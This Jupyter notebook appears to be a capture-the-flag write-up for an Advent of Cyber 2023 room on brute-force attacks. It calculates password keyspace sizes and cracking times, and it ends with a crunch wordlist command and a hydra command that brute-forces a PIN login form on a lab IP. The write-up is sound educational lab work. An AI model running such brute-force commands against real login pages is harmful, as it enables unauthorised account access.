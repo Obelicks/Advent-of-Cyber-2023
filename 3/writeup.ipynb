{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Brute Force Attacks\n",
    "Normal 4 number pincode has 10 to the power of 4 different combinations"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "10000\n"
     ]
    }
   ],
   "source": [
    "print(10*10*10*10) #Yeah i could have done this in my head. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Lets try with some letters, english alphabet."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "62\n"
     ]
    }
   ],
   "source": [
    "digits= 10\n",
    "uppercase_letters = 26\n",
    "lowercase_letters = 26\n",
    "total = digits + lowercase_letters + uppercase_letters\n",
    "print(total)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## How many combinations does a password of length n have?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "with a password length of 4 there are 14776336 combinations\n",
      "with a password length of 5 there are 916132832 combinations\n",
      "with a password length of 6 there are 56800235584 combinations\n",
      "with a password length of 7 there are 3521614606208 combinations\n",
      "with a password length of 8 there are 218340105584896 combinations\n",
      "with a password length of 9 there are 13537086546263552 combinations\n",
      "with a password length of 10 there are 839299365868340224 combinations\n",
      "with a password length of 11 there are 52036560683837095936 combinations\n",
      "with a password length of 12 there are 3226266762397899816960 combinations\n",
      "with a password length of 13 there are 200028539268669802283008 combinations\n",
      "with a password length of 14 there are 12401769434657527540219904 combinations\n",
      "with a password length of 15 there are 768909704948766630184222720 combinations\n"
     ]
    }
   ],
   "source": [
    "import math\n",
    "for i in range(4,16):\n",
    "    print(\"with a password length of\",i, \"there are\", int(math.pow(total, i)), \"combinations\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## How long does it take to crack? \n",
    "Lets assume we can attempt a logon in 0.001 seconds meaning we can try a thousand passwords a second \n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "with a password length of 4 it takes 4.104537777777778 hours to exhaust all combinations\n",
      "with a password length of 5 it takes 254.48134222222222 hours to exhaust all combinations\n",
      "with a password length of 6 it takes 15777.843217777778 hours to exhaust all combinations\n",
      "with a password length of 7 it takes 978226.2795022223 hours to exhaust all combinations\n",
      "with a password length of 8 it takes 60650029.32913778 hours to exhaust all combinations\n",
      "with a password length of 9 it takes 3760301818.4065423 hours to exhaust all combinations\n",
      "with a password length of 10 it takes 233138712741.20563 hours to exhaust all combinations\n",
      "with a password length of 11 it takes 14454600189954.748 hours to exhaust all combinations\n",
      "with a password length of 12 it takes 896185211777194.4 hours to exhaust all combinations\n",
      "with a password length of 13 it takes 5.5563483130186056e+16 hours to exhaust all combinations\n",
      "with a password length of 14 it takes 3.4449359540715356e+18 hours to exhaust all combinations\n",
      "with a password length of 15 it takes 2.1358602915243518e+20 hours to exhaust all combinations\n"
     ]
    }
   ],
   "source": [
    "import math\n",
    "for i in range(4,16):\n",
    "    print(\"with a password length of\",i, \"it takes\", (int(math.pow(total, i))*0.001)/3600, \"hours to exhaust all combinations\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### length or complexity\n",
    "Some would argue that complexity is important in a password aswell and using symbols adds extra security to a password will make it even more hard to crack \n",
    "\n",
    "Lets double the total variable and see how much safer our password becomes."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "with a password length of 4 it takes 65.67260444444445 hours to exhaust all combinations\n",
      "with a password length of 5 it takes 8143.402951111111 hours to exhaust all combinations\n",
      "with a password length of 6 it takes 1009781.9659377778 hours to exhaust all combinations\n",
      "with a password length of 7 it takes 125212963.77628446 hours to exhaust all combinations\n",
      "with a password length of 8 it takes 15526407508.259272 hours to exhaust all combinations\n",
      "with a password length of 9 it takes 1925274531024.1497 hours to exhaust all combinations\n",
      "with a password length of 10 it takes 238734041846994.56 hours to exhaust all combinations\n",
      "with a password length of 11 it takes 2.9603021189027324e+16 hours to exhaust all combinations\n",
      "with a password length of 12 it takes 3.670774627439388e+18 hours to exhaust all combinations\n",
      "with a password length of 13 it takes 4.551760538024842e+20 hours to exhaust all combinations\n",
      "with a password length of 14 it takes 5.644183067150804e+22 hours to exhaust all combinations\n",
      "with a password length of 15 it takes 6.998787003266996e+24 hours to exhaust all combinations\n"
     ]
    }
   ],
   "source": [
    "import math\n",
    "total = total *2\n",
    "for i in range(4,16):\n",
    "    print(\"with a password length of\",i, \"it takes\", (int(math.pow(total, i))*0.001)/3600, \"hours to exhaust all combinations\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Alright this upped the time considerably, but one things remains clear, length adds a whole lot more time to crack the password than complexity does, \n",
    "and lets be honest most people would stick to conventional symbols for a password, so typing it in isnt a bother."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Commands to complete the room"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "cruch 3 3 0123456789ABCDEF -o 3digits.txt\n",
    "\n",
    "hydra -l '' -P 3digits.txt -f -v 10.10.75.137 http-post-form \"/login.php:pin=^PASS^:Access denied\" -s 8000"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
